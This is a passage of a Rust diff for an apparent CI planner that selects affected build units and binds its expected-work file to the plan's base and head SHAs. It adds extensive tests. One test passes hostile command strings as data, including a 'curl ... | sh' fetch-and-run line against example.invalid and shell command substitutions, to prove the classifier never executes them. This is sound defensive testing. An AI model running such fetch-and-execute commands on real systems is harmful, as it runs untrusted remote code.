@@ -439,7 +1138,8 @@ fn expand_selection_closure(units: &[WatchedUnit], changed: &BTreeSet<String>) -
 /// The full set with one shared fallback reason per unit: the planner could
 /// not prove a narrow selection, so every unit runs. Callers use it when the
 /// change list itself is unusable (no base, git unavailable, unparseable
-/// entries) so every fallback carries its reason.
+/// entries) so every fallback carries its reason, and the same reason is
+/// surfaced additively as [`AffectedSelection::fallback_reason`].
 #[must_use]
 pub(crate) fn fallback_selection(units: &[WatchedUnit], reason: &str) -> AffectedSelection {
     AffectedSelection {
@@ -450,6 +1150,7 @@ pub(crate) fn fallback_selection(units: &[WatchedUnit], reason: &str) -> Affecte
             .iter()
             .map(|unit| (unit.id.clone(), reason.to_owned()))
             .collect(),
+        fallback_reason: Some(reason.to_owned()),
     }
 }
 
@@ -1439,9 +2140,12 @@ pub(crate) fn render_report(verdict: &AggregateVerdict) -> String {
 }
 
 /// The planner's expected-work file: the units the run must account for, the
-/// explicit no-work marker, and the prerequisite map the aggregate checks.
+/// explicit no-work marker, the prerequisite map the aggregate checks, and
+/// the plan-transport identity binding this file to the plan that wrote it.
 /// `required` defaults to true: a unit is required unless the planner says
-/// otherwise.
+/// otherwise. The identity has no default: a file without it is unbound and
+/// the aggregate rejects it — a stale upload from an earlier run must never
+/// score against this run's results.
 #[derive(Clone, Debug, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub(crate) struct ExpectedWorkFile {
@@ -1451,6 +2155,12 @@ pub(crate) struct ExpectedWorkFile {
     pub(crate) units: Vec<ExpectedUnitFile>,
     #[serde(default)]
     pub(crate) prerequisites: BTreeMap<String, Vec<String>>,
+    /// The base SHA the plan diffed against, exactly as the planner saw it.
+    #[serde(default)]
+    pub(crate) base_sha: Option<String>,
+    /// The head SHA the plan selected for, exactly as the planner saw it.
+    #[serde(default)]
+    pub(crate) head_sha: Option<String>,
 }
 
 /// One expected unit in the planner's file.
@@ -1501,14 +2211,36 @@ pub(crate) struct ReportedResultFile {
 /// Parse an expected-work file and a results file, then [`aggregate`] them.
 /// Malformed files are usage errors naming the offending value; contradictory
 /// verdicts stay inside the returned [`AggregateVerdict`].
+///
+/// `base_sha`/`head_sha` are the aggregate job's own checkout SHAs (its
+/// `BASE_SHA`/`HEAD_SHA`): the file's recorded plan SHAs must match them —
+/// HEAD always, BASE unless the job runs without one (`workflow_dispatch`
+/// leaves `BASE_SHA` empty) — mirroring the selection artifact's SHA
+/// binding. A file from any other plan fails here, before any verdict: a
+/// stale upload, a mis-threaded artifact, or a forged identity never
+/// scores. In particular a stale `planned_no_work` marker with zero units
+/// passes only when its SHAs prove it is this plan's file.
 pub(crate) fn aggregate_files(
     expected_json: &str,
     results_json: &str,
+    base_sha: &str,
+    head_sha: &str,
 ) -> Result<AggregateVerdict, String> {
     let expected_file: ExpectedWorkFile = serde_json::from_str(expected_json)
         .map_err(|error| format!("the expected-work file is not valid JSON: {error}"))?;
     let results_file: ResultsFile = serde_json::from_str(results_json)
         .map_err(|error| format!("the results file is not valid JSON: {error}"))?;
+    let file_base = expected_file.base_sha.as_deref().ok_or_else(|| {
+        "the expected-work file is missing base_sha: refusing an unbound plan".to_owned()
+    })?;
+    let file_head = expected_file.head_sha.as_deref().ok_or_else(|| {
+        "the expected-work file is missing head_sha: refusing an unbound plan".to_owned()
+    })?;
+    if file_head != head_sha || (!base_sha.is_empty() && file_base != base_sha) {
+        return Err(format!(
+            "the expected-work file does not match this aggregate checkout: plan base SHA `{file_base}` vs aggregate base SHA `{base_sha}`; plan head SHA `{file_head}` vs aggregate head SHA `{head_sha}`"
+        ));
+    }
     let mut units = BTreeMap::new();
     for unit in expected_file.units {
         if unit.id.is_empty() {
@@ -1665,6 +2397,24 @@ mod tests {
             id: id.to_owned(),
             watch: watch.iter().map(ToString::to_string).collect(),
             depends_on: depends_on.iter().map(ToString::to_string).collect(),
+            kind: String::new(),
+            commands: Vec::new(),
+        }
+    }
+
+    fn watched_full(
+        id: &str,
+        watch: &[&str],
+        depends_on: &[&str],
+        kind: &str,
+        commands: &[&str],
+    ) -> WatchedUnit {
+        WatchedUnit {
+            id: id.to_owned(),
+            watch: watch.iter().map(ToString::to_string).collect(),
+            depends_on: depends_on.iter().map(ToString::to_string).collect(),
+            kind: kind.to_owned(),
+            commands: commands.iter().map(ToString::to_string).collect(),
         }
     }
 
@@ -1858,7 +2608,10 @@ mod tests {
     }
 
     #[test]
-    fn unmatched_and_global_paths_fall_back_to_full() -> Result<(), Box<dyn std::error::Error>> {
+    fn unmatched_transparent_path_selects_nothing() -> Result<(), Box<dyn std::error::Error>> {
+        // No watch owns the path and no unit resists proof (unknown kinds
+        // with no commands are transparent), so the change selects nothing
+        // instead of falling back to the full set.
         let units = vec![
             watched("rust-alpha", &["crates/alpha/**"], &[]),
             watched("node-beta", &["packages/beta/**"], &[]),
@@ -1868,8 +2621,394 @@ mod tests {
             &[change("unowned/notes.md", ChangeKind::Added)],
             FULL_SELECTION_PREFIXES,
         )?;
+        assert!(!selection.fallback_full);
+        assert!(selection.required.is_empty());
+        assert!(selection.full_units.is_empty());
+        assert!(selection.fallback_reason.is_none());
+        Ok(())
+    }
+
+    /// An unmatched path with an opaque minority selects every opaque unit
+    /// (all of them, not the first) plus the ordinary dependency closure —
+    /// never the transparent units, never the full set.
+    #[test]
+    fn unmatched_selects_only_opaque_units() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("rust-base", &["crates/base/**"], &[], "rust", &["true"]),
+            watched_full(
+                "bun-web",
+                &["web/**"],
+                &["rust-base"],
+                "bun",
+                &["bun run build"],
+            ),
+            watched_full("node-api", &["api/**"], &[], "node", &["node server.js"]),
+            watched_full(
+                "rust-app",
+                &["crates/app/**"],
+                &["node-api"],
+                "rust",
+                &["true"],
+            ),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(
+            !selection.fallback_full,
+            "an opaque minority narrows: {:?}",
+            selection.required
+        );
+        assert_eq!(
+            selection.required,
+            BTreeSet::from([
+                "bun-web".to_owned(),
+                "node-api".to_owned(),
+                "rust-app".to_owned(),
+                "rust-base".to_owned(),
+            ]),
+            "both opaque units plus the prerequisite and the dependent"
+        );
+        assert_eq!(
+            selection.full_units,
+            BTreeSet::from([
+                "bun-web".to_owned(),
+                "node-api".to_owned(),
+                "rust-app".to_owned(),
+            ]),
+            "prerequisites join required, not full"
+        );
+        assert!(
+            !selection.required.contains("rust-alpha"),
+            "transparent units stay out: {:?}",
+            selection.required
+        );
+        let reason = selection.fallback_reason.as_deref().unwrap_or("");
+        assert!(
+            reason.contains("selects only opaque units")
+                && reason.contains("bun-web")
+                && reason.contains("node-api")
+                && reason.contains("command read-globs"),
+            "the reason names the consulted sources and every opaque unit: {reason:?}"
+        );
+        for id in ["bun-web", "node-api"] {
+            assert!(
+                selection
+                    .explanations
+                    .get(id)
+                    .is_some_and(|explanation| explanation.contains("opaque fallback")),
+                "the opaque hit carries its marker: {:?}",
+                selection.explanations
+            );
+        }
+        Ok(())
+    }
+
+    /// No owner plus zero opaque units is proven irrelevance: the path
+    /// selects nothing, with no fallback flag and no reason.
+    #[test]
+    fn unmatched_with_no_opaque_is_irrelevant() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["true"]),
+        ];
+        let compiled = compile_ownership(&units)?;
+        assert!(
+            matches!(
+                classify_path(&compiled, "AGENTS.md"),
+                PathVerdict::Irrelevant
+            ),
+            "a parsed path with no owner and no opaque unit is irrelevant"
+        );
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(selection.required.is_empty());
+        assert!(selection.full_units.is_empty());
+        assert!(!selection.fallback_full);
+        assert!(selection.fallback_reason.is_none());
+        Ok(())
+    }
+
+    /// A contract-covered script overrides the generic opaque fallback: the
+    /// script change classifies owned and selects exactly its unit, not
+    /// every opaque unit.
+    #[test]
+    fn contract_covered_script_selects_exactly_its_unit() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let units = vec![
+            watched_full(
+                "bun-web",
+                &["web/**", "scripts/check-boundary.sh"],
+                &[],
+                "bun",
+                &["bun run build"],
+            ),
+            watched_full("node-api", &["api/**"], &[], "node", &["node server.js"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("scripts/check-boundary.sh", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["bun-web".to_owned()]),
+            "the script owner alone, not the opaque fallback set"
+        );
+        assert_eq!(selection.full_units, BTreeSet::from(["bun-web".to_owned()]));
+        assert!(
+            selection.fallback_reason.is_none(),
+            "an owned path carries no fallback reason: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    /// Unknown impact names the missing contract: the opaque and the
+    /// all-opaque reasons spell the `reads` keys that would narrow the
+    /// path, in singular and plural.
+    #[test]
+    fn unmatched_path_reason_names_the_missing_contract() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+            watched_full("node-api", &["api/**"], &[], "node", &["node server.js"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        let reason = selection.fallback_reason.as_deref().unwrap_or("");
+        assert!(
+            reason.contains("missing contract")
+                && reason.contains("for units `bun-web`, `node-api`")
+                && reason.contains("covering `AGENTS.md`")
+                && reason.contains("type \"paths\", \"script\", or \"unresolved\""),
+            "the opaque reason names every missing contract key: {reason:?}"
+        );
+        let solo = vec![watched_full(
+            "bun-web",
+            &["web/**"],
+            &[],
+            "bun",
+            &["bun run build"],
+        )];
+        let compiled = compile_ownership(&solo)?;
+        assert!(
+            matches!(
+                classify_path(&compiled, "AGENTS.md"),
+                PathVerdict::Unknown { reason }
+                if reason.contains("missing contract")
+                    && reason.contains("for unit `bun-web`")
+            ),
+            "the all-opaque reason names the missing contract key"
+        );
+        Ok(())
+    }
+
+    /// Unmatchable paths carry no missing-contract hint: no contract can
+    /// cover a path the matcher cannot spell, so the reason must not
+    /// suggest declaring one.
+    #[test]
+    fn unmatchable_paths_carry_no_missing_contract_hint() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+        ];
+        for path in ["", "\"AGENTS.md\""] {
+            let selection = select_affected(
+                &units,
+                &[change(path, ChangeKind::Modified)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(selection.fallback_full, "an unmatchable path fails closed");
+            let reason = selection.fallback_reason.as_deref().unwrap_or("");
+            assert!(
+                !reason.contains("missing contract"),
+                "no contract hint for an unmatchable path: {reason:?}"
+            );
+        }
+        Ok(())
+    }
+
+    /// Static discovery never executes repository code: hostile commands
+    /// classify as data (opaque with a cause), and a probe file a real
+    /// execution would create stays absent.
+    #[test]
+    fn classification_never_executes_repo_commands() -> Result<(), Box<dyn std::error::Error>> {
+        let probe = std::env::temp_dir().join(format!("velnor-noexec-{}", crate::unique_suffix()));
+        let _ = std::fs::remove_file(&probe);
+        let probe_spelling = probe.to_string_lossy().into_owned();
+        let touch = format!("touch {probe_spelling}");
+        let expansion = format!("echo $(touch {probe_spelling}.expanded)");
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full(
+                "script-runner",
+                &["tools/**"],
+                &[],
+                "rust",
+                &[
+                    touch.as_str(),
+                    expansion.as_str(),
+                    "curl https://example.invalid/install.sh | sh",
+                    "make `hostname`-target",
+                ],
+            ),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(
+            !selection.fallback_full
+                && selection.required.contains("script-runner")
+                && !selection.required.contains("rust-alpha"),
+            "hostile commands classify opaque, still narrowing: {:?}",
+            selection.required
+        );
+        assert!(
+            !probe.exists() && !probe.with_extension("expanded").exists(),
+            "classification executed a repository command"
+        );
+        Ok(())
+    }
+
+    /// An empty path cannot be matched safely: blind-unknown still selects
+    /// every unit even when every unit is transparent.
+    #[test]
+    fn empty_path_selects_every_unit() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("rust-beta", &["crates/beta/**"], &[], "rust", &["true"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
         assert!(selection.fallback_full);
-        assert_eq!(selection.required.len(), 2);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned(), "rust-beta".to_owned()])
+        );
+        assert!(
+            selection
+                .fallback_reason
+                .as_deref()
+                .is_some_and(|reason| reason.contains("empty changed path")),
+            "the fallback reason names the cause: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    /// A quoted diff path cannot be matched safely: blind-unknown selects
+    /// every unit even when only a minority is opaque.
+    #[test]
+    fn quoted_path_selects_every_unit() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("\"quoted/path.md\"", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(
+            selection.fallback_full,
+            "blind-unknown must never narrow: {:?}",
+            selection.required
+        );
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned(), "bun-web".to_owned()])
+        );
+        assert!(
+            selection
+                .fallback_reason
+                .as_deref()
+                .is_some_and(|reason| reason.contains("quoted")),
+            "the fallback reason names the cause: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    /// A proven owner selects its units even when another unit's commands
+    /// resist proof: ownership beats opacity, with no fallback reason.
+    #[test]
+    fn matched_path_owned_wins_over_opaque() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("crates/alpha/lib.rs", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned()]),
+            "the opaque unit stays out of an owned match"
+        );
+        assert!(
+            selection.fallback_reason.is_none(),
+            "a proven-narrow selection carries no fallback reason: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    /// The opaque-narrowed selection serializes as narrow-but-explained:
+    /// `fallback_full` is false, `required` is the opaque set, and
+    /// `fallback_reason` names the opaque units for the audit trail.
+    #[test]
+    fn opaque_narrowing_selection_shape() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        let json = serde_json::to_string(&selection).map_err(|error| error.to_string())?;
+        let shape: serde_json::Value =
+            serde_json::from_str(&json).map_err(|error| error.to_string())?;
+        assert_eq!(shape["fallback_full"], false);
+        assert_eq!(shape["required"], serde_json::json!(["bun-web"]));
+        assert_eq!(shape["full_units"], serde_json::json!(["bun-web"]));
+        assert!(
+            shape["fallback_reason"].as_str().is_some_and(|reason| {
+                reason.contains("selects only opaque units") && reason.contains("bun-web")
+            }),
+            "the serialized reason names the opaque set: {json}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn unknown_ci_contract_path_falls_back_to_full() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched("rust-alpha", &["crates/alpha/**"], &[]),
+            watched("node-beta", &["packages/beta/**"], &[]),
+        ];
         let selection = select_affected(
             &units,
             &[change(".github/workflows/ci.yml", ChangeKind::Modified)],
@@ -1880,6 +3019,664 @@ mod tests {
             selection.full_units, selection.required,
             "a fallback runs every unit at full scope"
         );
+        assert!(
+            selection
+                .fallback_reason
+                .as_deref()
+                .is_some_and(|reason| reason.contains("classification table")),
+            "the fallback reason names the consulted source: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn ci_aggregates_and_contract_globals_stay_full() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![watched("rust-alpha", &["crates/alpha/**"], &[])];
+        for path in [
+            ".github/workflows/ci-pr.yml",
+            ".github/workflows/ci-main.yml",
+            ".github/workflows/nightly.yml",
+            ".github/workflows/preview.yml",
+            ".github/workflows/ci-policy.yml",
+            ".github/actionlint.yaml",
+            ".github/ci/project.toml",
+            ".github/actions/setup-velnor-workflow/action.yml",
+        ] {
+            let selection = select_affected(
+                &units,
+                &[change(path, ChangeKind::Modified)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.fallback_full,
+                "global contract path must stay full: {path}"
+            );
+            assert_eq!(selection.required.len(), 1);
+        }
+        Ok(())
+    }
+
+    #[test]
+    fn report_action_and_contract_docs_stay_unknown() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![watched("rust-alpha", &["crates/alpha/**"], &[])];
+        for path in [
+            ".github/actions/report-velnor-ci-outcomes/action.yml",
+            ".github/AGENTS.md",
+            ".github/workflows/AGENTS.md",
+            ".github/dependabot.yml",
+        ] {
+            let selection = select_affected(
+                &units,
+                &[change(path, ChangeKind::Modified)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.fallback_full,
+                "unproven contract path must fail closed: {path}"
+            );
+        }
+        Ok(())
+    }
+
+    #[test]
+    fn kind_reusable_narrows_to_that_kind() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("rust-beta", &["crates/beta/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["true"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change(
+                ".github/workflows/ci-unit-rust.yml",
+                ChangeKind::Modified,
+            )],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned(), "rust-beta".to_owned()])
+        );
+        assert!(
+            selection
+                .explanations
+                .get("rust-alpha")
+                .is_some_and(|reason| reason.contains("kind reusable")),
+            "the kind hit carries its own reason: {:?}",
+            selection.explanations
+        );
+        let selection = select_affected(
+            &units,
+            &[change(
+                ".github/workflows/ci-unit-frobnicate.yml",
+                ChangeKind::Modified,
+            )],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(
+            selection.fallback_full,
+            "a reusable naming an unknown kind has unproven impact"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn release_and_maintenance_lanes_select_nothing() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["true"]),
+        ];
+        for path in [
+            ".github/workflows/release.yml",
+            ".github/workflows/maintenance.yml",
+            ".github/workflows/ci-runtime-products.yml",
+            ".github/workflows/ci-release-package-signer.yml",
+        ] {
+            let selection = select_affected(
+                &units,
+                &[change(path, ChangeKind::Modified)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.required.is_empty() && !selection.fallback_full,
+                "release lanes select nothing in affected scope: {path}"
+            );
+        }
+        // A release-lane change mixed with an owned change still selects the
+        // owned unit: the release path contributes nothing, it never vetoes.
+        let selection = select_affected(
+            &units,
+            &[
+                change(".github/workflows/release.yml", ChangeKind::Modified),
+                change("crates/alpha/lib.rs", ChangeKind::Modified),
+            ],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned()])
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn command_read_glob_owns_paths_watch_misses() -> Result<(), Box<dyn std::error::Error>> {
+        // The lint command reads every Markdown file while the watch names
+        // only the top level: a nested document is owned, not fallback.
+        let lint = "npx --yes markdownlint-cli2@0.20.0 \"**/*.md\" \"#node_modules\"";
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("docs", &["*.md"], &[], "docs", &[lint]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("guides/nested/page.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["docs".to_owned()]),
+            "proven ownership narrows even when the owning unit is otherwise opaque"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn ignore_globs_cancel_read_glob_ownership() -> Result<(), Box<dyn std::error::Error>> {
+        let lint = "npx --yes markdownlint-cli2@0.20.0 \"**/*.md\" \"#**/AGENTS.md\"";
+        let units = vec![watched_full(
+            "docs",
+            &["content/docs/**/*.mdx"],
+            &[],
+            "docs",
+            &[lint],
+        )];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        // The ignore-glob excludes the contributor doc from ownership, and
+        // the lint runner is opaque, so the path falls back instead of
+        // selecting nothing.
+        assert!(selection.fallback_full);
+        Ok(())
+    }
+
+    #[test]
+    fn package_units_with_real_commands_stay_opaque() -> Result<(), Box<dyn std::error::Error>> {
+        for (id, kind, command) in [
+            ("bun-web", "bun", "bun run build"),
+            ("node-api", "node", "node server.js"),
+            ("bun-bare", "bun", "vite build"),
+        ] {
+            let units = vec![
+                watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+                watched_full(id, &["web/**"], &[], kind, &[command]),
+            ];
+            let selection = select_affected(
+                &units,
+                &[change("assets/logo.png", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                !selection.fallback_full,
+                "an opaque minority narrows instead of falling back to full: {command}"
+            );
+            assert_eq!(
+                selection.required,
+                BTreeSet::from([id.to_owned()]),
+                "the unmatched path selects only the opaque unit: {command}"
+            );
+            assert!(
+                selection
+                    .fallback_reason
+                    .as_deref()
+                    .is_some_and(|reason| reason.contains("command read-globs")
+                        && reason.contains(id)
+                        && reason.contains("selects only opaque units")),
+                "the fallback reason names the consulted sources and the opaque unit: {:?}",
+                selection.fallback_reason
+            );
+        }
+        // Provably-pure commands keep a package unit transparent.
+        let units = vec![watched_full("bun-web", &["web/**"], &[], "bun", &["true"])];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(selection.required.is_empty() && !selection.fallback_full);
+        Ok(())
+    }
+
+    #[test]
+    fn unprovable_command_syntax_fails_closed() -> Result<(), Box<dyn std::error::Error>> {
+        for command in [
+            "lint src/*.md",
+            "echo $HOME",
+            "echo `whoami`",
+            "echo don't",
+            "run -- --plain --check ../..",
+        ] {
+            let units = vec![watched_full(
+                "rust-alpha",
+                &["crates/alpha/**"],
+                &[],
+                "rust",
+                &[command],
+            )];
+            let selection = select_affected(
+                &units,
+                &[change("unowned/notes.md", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.fallback_full,
+                "unprovable argv must fail closed: {command}"
+            );
+        }
+        Ok(())
+    }
+
+    #[test]
+    fn code_execution_commands_stay_opaque_but_tests_stay_narrow(
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        // `mbx run` executes project code (here, over the repository root),
+        // so paths it might read fall back.
+        let units = vec![watched_full(
+            "rust-alpha",
+            &["crates/alpha/**"],
+            &[],
+            "rust",
+            &["cd -- 'crates/alpha' && mbx run --locked -- --plain --check ../.."],
+        )];
+        let selection = select_affected(
+            &units,
+            &[change("unowned/notes.md", ChangeKind::Added)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(selection.fallback_full);
+        // The test runners spell `run` too, but behind `nextest`: they run
+        // the unit's tests, whose inputs the watch covers.
+        for command in [
+            "cd -- 'crates/alpha' && mbx nextest run --locked",
+            "cargo nextest run --locked",
+            "cargo test --locked",
+        ] {
+            let units = vec![watched_full(
+                "rust-alpha",
+                &["crates/alpha/**"],
+                &[],
+                "rust",
+                &[command],
+            )];
+            let selection = select_affected(
+                &units,
+                &[change("unowned/notes.md", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.required.is_empty() && !selection.fallback_full,
+                "test commands stay transparent: {command}"
+            );
+        }
+        Ok(())
+    }
+
+    /// A declared read unions into the unit's watch at generation time, so
+    /// selection sees one seam: a path no scan watch owns still selects the
+    /// unit whose declared reads cover it instead of selecting nothing.
+    #[test]
+    fn declared_reads_in_watch_select_their_declared_consumer(
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full(
+                "rust-alpha",
+                &["crates/alpha/**", "schemas/**"],
+                &[],
+                "rust",
+                &["true"],
+            ),
+            watched_full("rust-beta", &["crates/beta/**"], &[], "rust", &["true"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("schemas/foo.json", ChangeKind::Added)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned()]),
+            "the declared consumer owns its declared inputs"
+        );
+        Ok(())
+    }
+
+    /// Runner detection is basename-literal and script execution is opaque:
+    /// path-spelled runners, non-listed interpreters with a script operand,
+    /// and `;`-joined commands all fail closed on undeclared inputs.
+    #[test]
+    fn unlisted_execution_spellings_stay_opaque() -> Result<(), Box<dyn std::error::Error>> {
+        for command in [
+            "python3 scripts/check.py",
+            "/usr/bin/make check",
+            "./scripts/build.sh",
+            "scripts/check.sh --strict",
+            "cd crates/alpha;make check",
+        ] {
+            let units = vec![watched_full(
+                "rust-alpha",
+                &["crates/alpha/**"],
+                &[],
+                "rust",
+                &[command],
+            )];
+            let selection = select_affected(
+                &units,
+                &[change("schemas/foo.json", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.fallback_full,
+                "unprovable execution must fail closed: {command}"
+            );
+            assert!(
+                selection
+                    .fallback_reason
+                    .as_deref()
+                    .is_some_and(|reason| reason.contains("command read-globs")),
+                "the fallback reason names the consulted sources: {:?}",
+                selection.fallback_reason
+            );
+        }
+        // Declared coverage still narrows: the changed path is owned, and
+        // proven ownership wins over the unit's opacity.
+        let units = vec![watched_full(
+            "rust-alpha",
+            &["crates/alpha/**", "schemas/**"],
+            &[],
+            "rust",
+            &["python3 scripts/check.py"],
+        )];
+        let selection = select_affected(
+            &units,
+            &[change("schemas/foo.json", ChangeKind::Added)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["rust-alpha".to_owned()]),
+            "a declared input narrows even when the owning unit executes scripts"
+        );
+        Ok(())
+    }
+
+    /// The `nextest` exemption needs `nextest` adjacent to the runner token:
+    /// `cargo run -p nextest` runs project code and must stay opaque.
+    #[test]
+    fn nextest_exemption_requires_runner_adjacency() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![watched_full(
+            "rust-alpha",
+            &["crates/alpha/**"],
+            &[],
+            "rust",
+            &["cargo run -p nextest"],
+        )];
+        let selection = select_affected(
+            &units,
+            &[change("unowned/notes.md", ChangeKind::Added)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(
+            selection.fallback_full,
+            "a distant `nextest` must not exempt code execution"
+        );
+        for command in [
+            "cargo nextest run --locked",
+            "cd -- 'crates/alpha' && mbx nextest run --locked",
+        ] {
+            let units = vec![watched_full(
+                "rust-alpha",
+                &["crates/alpha/**"],
+                &[],
+                "rust",
+                &[command],
+            )];
+            let selection = select_affected(
+                &units,
+                &[change("unowned/notes.md", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.required.is_empty() && !selection.fallback_full,
+                "adjacent `nextest` still exempts the test runner: {command}"
+            );
+        }
+        Ok(())
+    }
+
+    /// Command-vocabulary conformance: every lane-command shape the
+    /// generator can emit maps to its expected verdict, so a future recipe
+    /// the classifier mishandles fails here instead of silently skipping
+    /// verification. Transparent rows name why the scan's watch sets bound
+    /// the tool's reads; opaque rows name the unprovable execution or argv.
+    /// Unlisted execution shapes (`cargo xtask`, `python3 -c`, a quoted
+    /// script operand) fail closed.
+    #[test]
+    fn emitted_command_vocabulary_conformance() -> Result<(), Box<dyn std::error::Error>> {
